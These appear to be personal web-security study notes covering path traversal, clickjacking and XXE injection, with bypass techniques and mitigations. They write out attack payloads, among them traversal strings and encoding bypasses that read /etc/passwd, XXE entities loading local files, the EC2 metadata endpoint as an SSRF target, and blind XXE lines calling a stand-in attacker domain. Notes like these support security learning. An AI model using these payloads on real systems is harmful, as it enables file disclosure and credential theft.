## Path Traversal:

Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:

- Application code and data.
- Credentials for back-end systems.
- Sensitive operating system files.


**`/var/www/images/../../../etc/passwd`**
The sequence `../` is valid within a file path, and means to step up one level in the directory structure. The three consecutive `../` sequences step up from `/var/www/images/` to the filesystem root, and so the file that is actually read is:
**`/etc/passwd`**

On Windows, both `../` and `..\` are valid directory traversal sequences.


#### Common obstacles to exploiting path traversal vulnerabilities:   
###### (all points are one methods):

- You might be able to use an absolute path from the filesystem root, such as `filename=/etc/passwd`, to directly reference a file without using any traversal sequences.
- You might be able to use nested traversal sequences, such as `....//` or `....\/`
    **What are Nested Traversal Sequences?**
	Nested traversal sequences involve using multiple directory traversal patterns within a single input. For example:  `....//` or `....\/` can be used in an attempt to bypass security filters that sanitize input by stripping out certain characters.
	- **Nested Sequences**: Using nested sequences like `....//....//etc/passwd` or `....\/....\/etc/passwd` could allow access if the application fails to sanitize inputs correctly.
	- **Cross-Platform Considerations**
	  It's important to note that different operating systems handle directory separators differently:
	  Windows allows both forward slashes (`/`) and backslashes (`\`), while UNIX-based systems primarily use forward slashes. Attackers may exploit this by testing both types of slashes depending on the server's OS[](https://blog.certcube.com/a-guide-to-directory-traversal-vulnerability/)

- In a URL path or the `filename` parameter of a `multipart/form-data` request, web servers may strip any directory traversal sequences before passing your input to the application. You can sometimes bypass this kind of sanitization by ==**URL encoding, or even double URL encoding,**== the `../` characters. This results in `%2e%2e%2f` and `%252e%252e%252f` respectively. Various non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`, may also work. 


-  user-supplied filename to start with the expected base folder, such as `/var/www/images`. In this case, it might be possible to include the required base folder followed by suitable traversal sequences. For example: `filename=/var/www/images/../../../etc/passwd`.

- **Null Byte Injection**:
   **Terminates Strings**: The null byte (`%00`) is often used in programming languages, particularly in C and C-like languages, to signify the end of a string. When included in a filename, it can trick the application into treating everything before the null byte as the filename, while ignoring anything that follows it.
   
   **Bypassing File Extension Checks**: In the context of web applications, if an application expects filenames to end with a specific extension (like `.png`), adding `%00` effectively terminates the filename at `../../../etc/passwd`. This means that the application may only see `../../../etc/passwd` as the valid filename and ignore `.png`, allowing access to sensitive files like `/etc/passwd`.

  User-supplied filename to end with an expected file extension, such as `.png`. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example: `filename=../../../etc/passwd%00.png`.

  #### Mitigation strategies:
- **Input Validation**: Ensure user inputs are strictly validated by rejecting any input containing illegal characters or patterns such as `..`, `/`, or `\`. Implement allow lists to specify which files or directories are accessible.
- **Sanitization**: Sanitize inputs by removing or encoding dangerous characters as an additional layer of security to reduce the risk of exploitation through unexpected input.
- **Path Canonicalization**: Utilize built-in functions for path normalization, such as `realpath()` in PHP or `Path.Combine()` in .NET, to resolve file paths to their absolute forms and strip out potentially malicious sequences.
- **Restrict File Access**: Apply the principle of least privilege by ensuring the application has only the minimum necessary permissions to access files, and isolate execution environments using techniques like chroot jails or virtual directories to restrict access to sensitive areas of the filesystem.


## Clickjacking / UI redressing:

Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website(perhaps this is a link provided by an email).

Clickjacking is a malicious technique that tricks users into clicking on something different from what they perceive, often by overlaying a transparent iframe over a legitimate webpage.

The technique depends upon the incorporation of an invisible, actionable web page (or multiple pages) containing a button or hidden link, say, within an iframe.

**The iframe is overlaid on top of the user's anticipated decoy web page content.**

#### Bypassing CSRF Token:
CSRF tokens are effective in preventing CSRF attacks by ensuring that requests come from authenticated users, they do not mitigate clickjacking attacks due to the nature of how these attacks operate.
Clickjacking takes advantage of user interaction with visible elements, ==**clickjacking often bypassing protections like CSRF tokens because the actions occur within a legitimate session context.**==

**To protect against clickjacking**, additional measures such as implementing **==`X-Frame-Options` or Content Security Policy (CSP)==** headers are necessary to prevent unauthorized framing of web content.

#### Construction of clickjacking page:

The use of ***iframes*** in CSS involves embedding external content within a webpage and styling that content to fit seamlessly into the design of the site.

![[Pasted image 20241102233830.png]]


## XXE (XML External Entity) injection:

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.
![[xxe-injection.svg]]
### How do XXE vulnerabilities arise?:
XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.

***XML*** stands for "extensible markup language". XML is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data.

***XML entities*** are a way of representing an item of data within an XML document, instead of using the data itself.

===============================================================
### What is document type definition (DTD) ?

The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. 

***==The DTD is declared within the optional `DOCTYPE` element at the start of the XML document.==***

The DTD can be fully self-contained within the document itself (known as an "internal DTD") or 
can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.

===============================================================
### What are XML custom entities?

XML allows custom entities to be defined within the DTD.
`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

This definition means that any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value: "`my entity value`".

===============================================================
### What are XML external entities (custom entity only but diff)?
XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.
The declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded. For example:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

The URL can use the `file://` protocol, and so external entities can be loaded from file. For example:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" >] >`

==============================================================
### What are the types of XXE attacks?

- [Exploiting XXE to retrieve files](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files), where an external entity is defined containing the contents of a file, and returned in the application's response.
- [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks), where an external entity is defined based on a URL to a back-end system.
- [Exploiting blind XXE exfiltrate data out-of-band](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band), where sensitive data is transmitted from the application server to a system that the attacker controls.
- [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages), where the attacker can trigger a parsing error message containing sensitive data.
### Exploiting XXE to retrieve files:

To modify the submitted XML in two ways:
- Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.
- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

![[Pasted image 20241104210808.png]]

### Exploiting XXE to perform SSRF attacks:

##### ***Extra:***
[

EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
Accessing the key from the EC2 metadata endpoint refers to retrieving ***temporary security credentials associated with an IAM role attached to an Amazon EC2*** instance through the Instance Metadata Service (IMDS).  

#### Instance Metadata Service (IMDS)
**Overview**: Every EC2 instance can access IMDS at the IP address `169.254.169.254`. This service allows instances to retrieve metadata, including the IAM role's temporary security credentials, which consist of an Access Key ID, Secret Access Key, and a session token

###### IMDS Versions:
- **IMDSv1**: The original version that does not require authentication for access.
- **IMDSv2**: Introduced additional security features, including ***session tokens to mitigate risks such as Server-Side Request Forgery (SSRF) attacks***. To use IMDSv2, a token must be generated first via a PUT request before accessing metadata[](https://hackingthe.cloud/aws/general-knowledge/intro_metadata_service/)

]


![[Pasted image 20241104221629.png]]


### What is blind XXE?

Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.

There are two broad ways in which you can find and exploit blind XXE vulnerabilities:

- You can trigger **out-of-band network interactions,** sometimes exfiltrating sensitive data within the interaction data.
- You can trigger XML parsing errors in such a way that the error messages contain sensitive data.
-------------------------------------------------------------------------------
#### Blind XXE detecting using out-of-band techniques:

You can often detect blind XXE using the same technique as for [XXE SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks) but triggering the out-of-band network interaction to a system that you control

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>`

-------------------------------------------------------------------------------------------------------------
#### Blind XXE detecting using out-of-band techniques via XML entities:
blind XXE using out-of-band detection via XML parameter entities as follows:

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

-------------------------------------------------------------------------------------------------------------
